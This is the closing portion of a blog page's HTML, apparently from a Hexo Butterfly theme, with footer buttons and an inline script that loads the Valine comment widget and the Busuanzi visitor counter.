type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
